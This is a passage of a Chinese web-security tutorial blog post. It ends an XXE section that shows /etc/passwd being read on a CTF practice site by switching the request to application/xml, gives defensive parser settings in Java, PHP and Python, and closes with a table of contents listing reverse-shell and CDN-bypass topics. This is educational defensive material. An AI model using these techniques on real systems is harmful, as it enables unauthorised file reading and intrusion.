src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907205914521.png\" alt=\"image-20250907205914521\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907210442732.png\" alt=\"image-20250907210442732\"></p>\n</li>\n<li>\n<p>成功读取到文件内容！</p>\n</li>\n</ul>\n<h4 id=\"四、XXE-黑盒-JS-类型修改\">四、XXE 黑盒&amp;JS&amp;类型修改</h4>\n<ul>\n<li>\n<p>有些网站，即使用的<code>JSON</code>或者其他的格式传输数据，但是也可以使用<code>XML</code>去尝试<code>XXE</code></p>\n</li>\n<li>\n<p>比如这里有个网站地址： <a href=\"http://web.jarvisoj.com:9882/\">http://web.jarvisoj.com:9882/</a></p>\n</li>\n<li>\n<p>打开是一个输入框，抓包看看数据传输的格式：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907211313477.png\" alt=\"image-20250907211313477\"></p>\n</li>\n<li>\n<p>这里采用的是<code>JSON</code>传输，但是这就代表不能使用<code>XXE</code>了吗？我们也可以尝试一下啊，转到<code>Repeater</code>模块，随便发送一个<code>payload</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907211339419.png\" alt=\"image-20250907211339419\"></p>\n</li>\n<li>\n<p>好像没什么用，但是我们这里尝试让他的<code>Content-Type=application/xml</code>呢？</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907211414449.png\" alt=\"image-20250907211414449\"></p>\n</li>\n<li>\n<p>欸，成功读取到了<code>/etc/passwd</code>的内容，你可能会问，这是什么原因呢？因为有什么样的功能就会用到什么样的函数，那什么样的函数就可能造成什么样的漏洞，我们这里可以<code>F12</code>看一看传入的参数做了什么处理：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250907211847506.png\" alt=\"image-20250907211847506\"></p>\n</li>\n<li>\n<p>很明显的可以看到这里用了一个<code>XMLHttpRequest()</code>函数来处理<code>xml</code>，虽然这个函数本身不太可能触发<code>XXE</code>，但是解析的后端代码可能出现，因为它允许你传入<code>xml</code>的数据，那这时候就只能靠运气了</p>\n</li>\n</ul>\n<h4 id=\"五、XXE-防御手段\">五、XXE 防御手段</h4>\n<ul>\n<li>\n<p>讲了几个XXE的利用手段和绕过策略，这里讲一下如何去防御XXE，其实它的核心就是”<strong>让 XML 解析器永远不要去加载外部实体</strong></p>\n</li>\n<li>\n<p><code>Java</code>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">DocumentBuilderFactory</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> DocumentBuilderFactory.newInstance();</span><br><span class=\"line\">f.setFeature(<span class=\"string\">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">f.setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">f.setFeature(<span class=\"string\">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">f.setXIncludeAware(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"type\">DocumentBuilder</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> f.newDocumentBuilder();</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>PHP</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// PHP ≥ 8.0 已废弃 libxml_disable_entity_loader，</span></span><br><span class=\"line\"><span class=\"comment\">// 直接设置选项即可</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">libxml_disable_entity_loader</span>(<span class=\"literal\">true</span>);   <span class=\"comment\">// PHP &lt; 8.0</span></span><br><span class=\"line\"><span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">DOMDocument</span>();</span><br><span class=\"line\"><span class=\"variable\">$dom</span>-&gt;<span class=\"title function_ invoke__\">loadXML</span>(<span class=\"variable\">$xml</span>, LIBXML_NONET | LIBXML_NOENT | LIBXML_NOERROR);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>Python</code>：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etreexmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=<span class=\"literal\">False</span>))</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>当然也可以去过滤用户提交的XML数据，比如过滤关键字等等</p>\n</li>\n</ul>\n<h3 id=\"PHP反序列化\">PHP反序列化</h3>\n","feature":true,"text":"网安知识点 基础入门 一、Web 应用 Web 四大件 1.系统 Linux、windows、macos 2.中间件 我们经常管 web 中间件叫做 web 服...","permalink":"/post/网安知识点","photos":[],"count_time":{"symbolsCount":"145k","symbolsTime":"2:12"},"categories":[{"name":"网安基础","slug":"网安基础","count":4,"path":"api/categories/网安基础.json"}],"tags":[{"name":"Web安全","slug":"Web安全","count":4,"path":"api/tags/Web安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\">网安知识点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8\"><span class=\"toc-text\">基础入门</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81Web-%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">一、Web 应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Web-%E5%9B%9B%E5%A4%A7%E4%BB%B6\"><span class=\"toc-text\">Web 四大件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E7%B3%BB%E7%BB%9F\"><span class=\"toc-text\">1.系统</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E4%B8%AD%E9%97%B4%E4%BB%B6\"><span class=\"toc-text\">2.中间件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">3.数据库</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">4.源码</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Web-%E6%9E%B6%E6%9E%84\"><span class=\"toc-text\">Web 架构</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%B8%B8%E8%A7%84%E5%8C%96\"><span class=\"toc-text\">1.常规化</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB\"><span class=\"toc-text\">2.站库分离</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB\"><span class=\"toc-text\">3.前后端分离</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E5%AE%9D%E5%A1%94-phpstudy\"><span class=\"toc-text\">4.宝塔+phpstudy</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-Docker-%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">5.Docker 容器</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E5%BB%BA%E7%AB%99%E5%88%86%E9%85%8D%E7%AB%99\"><span class=\"toc-text\">6.建站分配站</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-%E9%9D%99%E6%80%81-Web\"><span class=\"toc-text\">7.静态 Web</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8-WAF\"><span class=\"toc-text\">8.WAF</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9-CDN\"><span class=\"toc-text\">9.CDN</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#10-OSS\"><span class=\"toc-text\">10.OSS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#11-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86\"><span class=\"toc-text\">11.反向代理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#12-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1\"><span class=\"toc-text\">12.负载均衡</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81App-%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">二、App 应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84\"><span class=\"toc-text\">应用开发架构</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">1.原生开发</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-H5-%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">2.H5 语言开发</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E4%BD%BF%E7%94%A8-flutter-%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">3.使用 flutter 开发</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E5%B8%B8%E8%A7%84-Web-%E5%BC%80%E5%8F%91\"><span class=\"toc-text\">4.常规 Web 开发</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BC%B9-shell\"><span class=\"toc-text\">三、反弹 shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">1.文件上传下载</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%8F%8D%E5%BC%B9-shell-%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2.反弹 shell 命令</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">四、抓包工具</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Fiddler\"><span class=\"toc-text\">Fiddler</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Charles\"><span class=\"toc-text\">Charles</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#TcpDump\"><span class=\"toc-text\">TcpDump</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#BurpSuite\"><span class=\"toc-text\">BurpSuite</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Wireshark\"><span class=\"toc-text\">Wireshark</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%A7%91%E6%9D%A5%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F\"><span class=\"toc-text\">科来网络分析系统</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%90%84%E4%B8%AA%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B7%AE%E5%BC%82\"><span class=\"toc-text\">各个抓包工具的差异</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">五、算法加密</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-span-style-font-size-1-2em-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86%E7%9A%84%E5%BA%94%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%AE%89%E5%85%A8%E4%BB%B7%E5%80%BC-span\"><span class=\"toc-text\">1.算法加密的应用对象和安全价值</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">2.数据传输</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95\"><span class=\"toc-text\">3.常见加密算法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-1-%E5%8D%95%E5%90%91%E6%95%A3%E5%88%97%E5%8A%A0%E5%AF%86-span\"><span class=\"toc-text\">3.1.单向散列加密</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-2-%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86-span\"><span class=\"toc-text\">3.2.对称加密</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-3-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">3.3.非对称加密</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-4-Base-%E7%B3%BB%E5%88%97%E5%8A%A0%E5%AF%86\"><span class=\"toc-text\">3.4.Base 系列加密</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-5-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%B9%E6%AF%94%E4%B8%8E%E9%80%89%E5%9E%8B-span\"><span class=\"toc-text\">3.5.加密算法的对比与选型</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9\"><span class=\"toc-text\">4.加密算法的特点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-4-1-MD5-span\"><span class=\"toc-text\">4.1.MD5</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-4-2-Base64-span\"><span class=\"toc-text\">4.2.Base64</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-4-3-AES%E3%80%81DES-span\"><span class=\"toc-text\">4.3.AES、DES</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-4-4-RSA-span\"><span class=\"toc-text\">4.4.RSA</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81HTTP-%E6%95%B0%E6%8D%AE%E5%8C%85\"><span class=\"toc-text\">六、HTTP 数据包</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81HTPP-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">一、HTPP 数据包基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%AE%9A%E4%BD%8D\"><span class=\"toc-text\">1. 定义与定位</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E9%80%9A%E4%BF%A1%E6%A8%A1%E5%9E%8B\"><span class=\"toc-text\">2. 通信模型</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">二、请求报文结构解析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-1-%E8%AF%B7%E6%B1%82%E8%A1%8C-%EF%BC%88Request-Line%EF%BC%89-span\"><span class=\"toc-text\">1. 请求行**（Request Line）**</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-2-%E8%AF%B7%E6%B1%82%E5%A4%B4-%EF%BC%88Request-Headers%EF%BC%89-span\"><span class=\"toc-text\">2.请求头**（Request Headers）**</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-%E8%AF%B7%E6%B1%82%E4%BD%93-%EF%BC%88Request-Body%EF%BC%89-span\"><span class=\"toc-text\">3.请求体**（Request Body）**</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">三、响应报文结构解析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-1-%E7%8A%B6%E6%80%81%E8%A1%8C-%EF%BC%88Status-Line%EF%BC%89-span\"><span class=\"toc-text\">1.状态行**（Status Line）**</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-2-%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E7%B1%BB-span\"><span class=\"toc-text\">2.状态码分类</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-%E5%93%8D%E5%BA%94%E5%A4%B4-%EF%BC%88Response-Headers%EF%BC%89-span\"><span class=\"toc-text\">3.响应头**（Response Headers）**</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-4-%E5%93%8D%E5%BA%94%E4%BD%93-%EF%BC%88Response-Body%EF%BC%89-span\"><span class=\"toc-text\">4.响应体**（Response Body）**</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81HTTP-%E6%96%B9%E6%B3%95%E5%85%A8%E9%9B%86\"><span class=\"toc-text\">四、HTTP 方法全集</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81HTTPS-%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%BD%B1%E5%93%8D\"><span class=\"toc-text\">五、HTTPS 对数据包的影响</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E5%8D%8F%E8%AE%AE%E6%BC%94%E8%BF%9B\"><span class=\"toc-text\">六、协议演进</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-1-HTTP-1-1-span\"><span class=\"toc-text\">1.HTTP&#x2F;1.1</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-2-HTTP-2-span\"><span class=\"toc-text\">2.HTTP&#x2F;2</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#span-style-font-size-1-1em-3-HTTP-3-span\"><span class=\"toc-text\">3.HTTP&#x2F;3</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%83%E3%80%81%E8%A1%A5%E5%85%85\"><span class=\"toc-text\">七、补充</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%AB%E3%80%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE\"><span class=\"toc-text\">八、思维导图</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9\"><span class=\"toc-text\">信息打点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81Web-%E5%BA%94%E7%94%A8-2\"><span class=\"toc-text\">一、Web 应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-Web-%E5%8D%95%E5%9F%9F%E5%90%8D\"><span class=\"toc-text\">1.Web 单域名</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-Web-%E5%AD%90%E5%9F%9F%E5%90%8D\"><span class=\"toc-text\">2.Web 子域名</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89DNS-%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">（1）DNS 数据查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">（2）证书查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">（3）网络空间查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">（4）威胁情报查询</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%885%EF%BC%89%E6%9E%9A%E4%B8%BE%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">（5）枚举解析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%886%EF%BC%89%E5%AF%B9%E6%AF%94%E4%B8%8E%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE\"><span class=\"toc-text\">（6）对比与实战建议</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%BA%90%E7%A0%81%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">3.源码获取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-1-%E5%BC%80%E6%BA%90\"><span class=\"toc-text\">3.1.开源</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-2-%E9%97%AD%E6%BA%90\"><span class=\"toc-text\">3.2.闭源</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89git-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（1）git 源码泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89svn-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（2）svn 源码泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89hg-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（3）hg  源码泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89cvs-%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（4）cvs 泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%885%EF%BC%89Bazaar-bzr-%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（5）Bazaar&#x2F;bzr 泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%886%EF%BC%89%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">（6）网站备份压缩文件</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%887%EF%BC%89WEB-INF-web-xml-%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（7）WEB-INF&#x2F;web.xml 泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%888%EF%BC%89DS-Store-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（8）DS-Store 文件泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%889%EF%BC%89SWP-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（9）SWP 文件泄露</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%EF%BC%8810%EF%BC%89GitHub-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">（10）GitHub 源码泄露</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-3-%E9%BB%91%E7%81%B0%E4%BA%A7%E4%B8%9A%E6%BA%90%E7%A0%81%E5%95%86%E5%9F%8E\"><span class=\"toc-text\">3.3.黑灰产业源码商城</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-JS-%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84\"><span class=\"toc-text\">4.JS 前端架构</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-1-%E4%BB%80%E4%B9%88%E6%98%AF-JS-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9F\"><span class=\"toc-text\">4.1.什么是 JS 渗透测试？</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-2-JS-%E6%B3%84%E6%BC%8F%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2\"><span class=\"toc-text\">4.2. JS 泄漏的攻击面</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-3-%E6%B5%81%E8%A1%8C%E7%9A%84-JS-%E6%A1%86%E6%9E%B6\"><span class=\"toc-text\">4.3.流行的 JS 框架</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-4-JS-%E5%BC%80%E5%8F%91%E5%BA%94%E7%94%A8%E7%9A%84%E5%88%A4%E5%AE%9A\"><span class=\"toc-text\">4.4. JS 开发应用的判定</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-5-JS-%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E6%8A%80%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">4.5. JS 信息提取技术方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-6-%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">4.6.高危漏洞案例</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-%E8%AF%86%E5%88%AB%E9%98%B2%E7%81%AB%E5%A2%99\"><span class=\"toc-text\">5.识别防火墙</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#6-%E8%9C%9C%E7%BD%90\"><span class=\"toc-text\">6.蜜罐</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#7-CDN-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">7.CDN 绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81CDN-%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">一、CDN 介绍</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" 